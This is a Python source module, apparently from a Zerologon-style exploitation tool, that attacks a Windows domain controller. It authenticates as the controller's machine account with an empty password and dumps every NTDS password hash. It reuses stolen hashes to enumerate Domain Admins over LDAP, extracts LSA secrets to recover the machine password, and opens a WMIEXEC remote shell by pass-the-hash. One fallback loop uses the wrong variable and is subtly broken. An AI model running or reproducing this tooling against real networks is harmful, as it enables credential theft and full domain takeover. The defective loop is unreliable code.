import sys,logging,re,random
from io import StringIO
from binascii import unhexlify
from utils.wmiexec import *
from utils.restorepassword import ChangeMachinePassword
from impacket.ldap import ldap,ldapasn1
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, LSASecrets

searchResult = []
class restore_dump():
    def __init__(self,filanme,options):
        self.remoteName = options.dc_ip
        self.remoteHost = options.dc_ip
        self.dcName = options.dcname+"$"
        self.domain = options.domain    
        self.outputFileName = filanme
        self.options = options
        self.bootKey = None
        self.NTDSHashes = None
        self.smbConnection = None
        self.remoteOps = None
    
    def smbconnect(self,user,lmhash,nthash):
        try:
            self.smbConnection = SMBConnection(self.remoteName, self.remoteHost)
            self.smbConnection.login(user, '', self.domain, lmhash, nthash)
            self.remoteOps = RemoteOperations(self.smbConnection, False)
        
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

    def dumpHash(self):
        try:
            self.smbconnect(self.dcName,'','')
            self.NTDSHashes = NTDSHashes(None, None, isRemote=True, history=False,
                                            noLMHash=False, remoteOps=self.remoteOps,
                                            useVSSMethod=False, justNTLM=True,
                                            pwdLastSet=False, resumeSession=None,
                                            outputFileName=self.outputFileName, justUser=None,
                                            printUserStatus= False)
            self.NTDSHashes.dump()
            print("")
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

        self.NTDSHashes.finish()

    def SearchLdap(self):
        try:
            parts = self.domain.split('.')
            dn_parts = ['dc=' + part for part in parts]
            baseDN = ','.join(dn_parts)

            ldapConnection = ldap.LDAPConnection('ldap://%s'%self.domain, baseDN, self.remoteHost)
            
            try:
                ldapConnection.login(self.dcName, '', self.domain, '', '')
            except:
                with open(f'./{self.domain}/{self.dcName}.ntds', 'r', encoding='utf-8') as f:
                    text = f.readlines()
                random_line = random.choice(text)
                username = random_line.strip().split(":")[0]
                if "\\" in username:
                    username = username.split("\\")[1]
                lmhash = random_line.strip().split(":")[2]
                nthash = random_line.strip().split(":")[3]
                ldapConnection.login(username, '', self.domain, lmhash, nthash)
            
            searchFilter = f"(&(objectClass=user)(objectCategory=person)(memberOf=CN=Domain Admins,CN=Users,{baseDN})(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            
            resp = ldapConnection.search(
                searchFilter=searchFilter,
                attributes=[
                        "sAMAccountName"
                    ]
            )
            
            for item in resp:
                if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                    return
                sAMAccountName = ''
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        if attribute['vals'][0].asOctets().decode('utf-8').endswith('$') is False:
                            sAMAccountName = attribute['vals'][0].asOctets().decode('utf-8')
                            searchResult.append(sAMAccountName)
            ldapConnection.close()

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

    def dumpLSASecrets(self,user,lmhash,nthash):
        try:
            self.smbconnect(user,lmhash,nthash)
            self.remoteOps.setExecMethod(self.options.exec_method)
            self.remoteOps.enableRegistry()
            outputfile = f'./{self.domain}/{self.dcName}'
            LSASecret = LSASecrets(self.remoteOps.saveSECURITY(), self.remoteOps.getBootKey(), self.remoteOps, True, False)
            current = sys.stdout
            sys.stdout = StringIO()
            LSASecret.dumpSecrets()
            LSASecret.exportSecrets(outputfile)
            sys.stdout = current
            with open("%s.secrets"%outputfile) as f:
                content = f.readlines()
            hexpass = ""
            for i in content:
                if "plain_password_hex" in i:
                    hexpass = i.split(":")[2]
            LSASecret.finish()
            return unhexlify(hexpass.strip("\r\n"))
        
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

    def Automatic_recovery_shell(self):
        try:
            if self.options.user is None:
                self.options.user = 'Administrator'
            with open(f'./{self.domain}/{self.dcName}.ntds', 'r', encoding='utf-8') as f:
                for line in f.readlines():    
                    if re.search(f"^(?:.*\\\\)?{re.escape(self.options.user)}", line, re.IGNORECASE):
                        username = line.strip().split(":")[0]
                        if "\\" in username:
                            username = username.split("\\")[1]
                        lmhash = line.strip().split(":")[2]
                        nthash = line.strip().split(":")[3]
                        if self.options.shell:
                            executer = WMIEXEC(' ', username, '', self.options.domain, "{}:{}".format(lmhash, nthash), None,
                                self.options.share, False, False, None, self.options.shell_type)
                            executer.run(self.options.dc_ip, False)
                        else:
                            action = ChangeMachinePassword(self.dcName.rstrip('$'), self.dumpLSASecrets(username, lmhash , nthash))
                            action.dump(self.dcName.rstrip('$'), self.remoteHost,username)
                        break
        except:
            try:
                print("[-] Execution using Administrator account failed")
                self.SearchLdap()
                with open(f'./{self.domain}/{self.dcName}.ntds', 'r', encoding='utf-8') as fs:
                    for u in searchResult:
                        for lines in fs.readlines():
                            if re.search(f"^(?:.*\\\\)?{re.escape(u)}", lines, re.IGNORECASE):
                                username = lines.strip().split(":")[0]
                                if "\\" in username:
                                    username = username.split("\\")[1]
                                lmhash = line.strip().split(":")[2]
                                nthash = lines.strip().split(":")[3]
                                if self.options.shell:
                                    executer = WMIEXEC(' ', username, '', self.options.domain, "{}:{}".format(lmhash, nthash), None,
                                self.options.share, False, False, None, self.options.shell_type)
                                    executer.run(self.options.dc_ip, False)
                                else:
                                    action = ChangeMachinePassword(self.dcName.rstrip('$'), self.dumpLSASecrets(username, lmhash , nthash))
                                    action.dump(self.dcName.rstrip('$'), self.remoteHost,username)
                                break
                        if username is not None and nthash is not None:
                                break
            except:
                pass
    
    def Manual_recovery(self):
        lmhash, nthash = self.options.hashes.split(':')
        action = ChangeMachinePassword(self.dcName.rstrip('$'), self.dumpLSASecrets(self.options.user, lmhash, nthash))
        action.dump(self.dcName.rstrip('$'), self.remoteHost,self.options.user)
       